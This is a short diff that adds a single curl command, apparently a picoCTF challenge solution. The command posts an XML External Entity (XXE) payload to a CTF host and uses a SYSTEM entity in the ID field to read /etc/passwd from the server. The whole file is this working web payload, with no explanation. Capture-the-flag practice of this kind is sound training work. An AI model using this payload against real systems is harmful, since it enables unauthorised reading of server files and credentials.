@@ -1,0 +1,5 @@
+curl -X POST http://saturn.picoctf.net:51847/data \
+-H "Content-Type: application/xml" \
+-d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
+
+
